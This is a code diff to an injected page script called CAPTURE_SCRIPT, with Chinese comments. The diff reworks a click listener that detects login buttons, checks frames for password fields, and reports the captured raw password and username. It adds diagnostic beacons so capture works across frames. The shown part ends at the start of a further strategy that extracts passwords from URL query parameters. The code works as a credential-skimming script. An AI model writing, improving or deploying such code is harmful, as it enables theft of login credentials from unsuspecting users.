@@ -222,28 +222,49 @@ export const CAPTURE_SCRIPT = `
   }
 
   // Strategy G: 点击登录容器内的按钮/元素时上报（覆盖 click -> 读 DOM -> 任何提交方式）
+  //
+  // 诊断（2026-09-21）：过去"点登录没反应"只能靠日志缺行倒推（是点在别的 frame？还是本
+  // frame 有密码框但没观测到输入？）。现在只要点到按钮/登录文案且本 frame 有密码框或
+  // 点在登录容器内，就先上报一条 'click any' 诊断，把判断依据一次说清：
+  //   pwDoc      = 本 frame 内 input[type=password] 数量（0 说明登录框不在本 frame）
+  //   hasRawPass = 本 frame 闭包是否已拿到密码（0 说明输入没发生在本 frame）
   document.addEventListener('click', function(e) {
     try {
-      if (!_rawPass || _rawPass.length < 2) return;
       var target = e.target;
       if (!target || !target.closest) return;
-      var container = target.closest('form') || target.closest('[class*="login"]') || target.closest('[class*="con"]') || target.closest('[class*="pop"]');
-      if (!container) return;
-      var pwInContainer = container.querySelector('input[type="password"]');
-      if (!pwInContainer || !pwInContainer.value) return;
-      var text = (target.innerText || target.value || '').toLowerCase().trim();
+      var text = (target.innerText || target.value || '').toLowerCase().trim().slice(0, 24);
       var tagName = target.tagName || '';
       var isButton = tagName === 'BUTTON' || tagName === 'INPUT' && (target.type === 'submit' || target.type === 'button');
       var isLoginText = /登\\s*录|login|sign(?:\\s|_|-)*in|submit|确\\s*定|进\\s*入|go/.test(text);
-      if (isButton || isLoginText) {
-        var userNow = _rawUser || '';
-        var u = findUserInput(container);
-        if (u && u.value) userNow = u.value;
-        _baopEmit({_type:'baop_diag',msg:'click trigger isBtn='+isButton+' isLogin='+isLoginText+' host='+location.hostname});
-        report('click-login');
-      }
+      if (!isButton && !isLoginText) return;
+      var container = target.closest('form') || target.closest('[class*="login"]') || target.closest('[class*="con"]') || target.closest('[class*="pop"]');
+      var pwDoc = document.querySelectorAll('input[type="password"]').length;
+      if (pwDoc === 0 && !container) return; // 与登录无关的点击不刷日志
+      var pwInContainer = container ? container.querySelector('input[type="password"]') : null;
+      _baopEmit({_type:'baop_diag',msg:'click any tag='+tagName+' txt='+text+' pwDoc='+pwDoc
+        +' pwContainer='+(pwInContainer?1:0)+' hasRawPass='+(_rawPass?_rawPass.length:0)
+        +' btn='+isButton+' login='+isLoginText+' host='+location.hostname});
+      if (!_rawPass || _rawPass.length < 2) return;
+      if (!container) return;
+      if (!pwInContainer || !pwInContainer.value) return;
+      var userNow = _rawUser || '';
+      var u = findUserInput(container);
+      if (u && u.value) userNow = u.value;
+      _baopEmit({_type:'baop_diag',msg:'click trigger isBtn='+isButton+' isLogin='+isLoginText+' host='+location.hostname});
+      report('click-login');
     } catch(e) {}
   }, true);
+
+  // 诊断（2026-09-21）：延迟上报"本 frame 里到底有没有密码框"。
+  // 只报有密码框的 frame，避免每个 ad/空 frame 都刷一行；用于回答
+  // "登录框在哪个 frame"——若没有任何 frame 报 pwInputs，说明密码框不在可注入上下文内
+  // （弹窗/未注入 frame/自绘控件）。
+  setTimeout(function() {
+    try {
+      var n = document.querySelectorAll('input[type="password"]').length;
+      if (n > 0) _baopEmit({_type:'baop_diag',msg:'frame info pwInputs='+n+' host='+location.hostname});
+    } catch(e) {}
+  }, 1500);
 
   // Strategy H: 从任意 URL / script src 中解析 query 参数提取 password（覆盖 JSONP、<script> 注入、Image ping 等）
   function tryReportFromUrl(urlStr, src) {
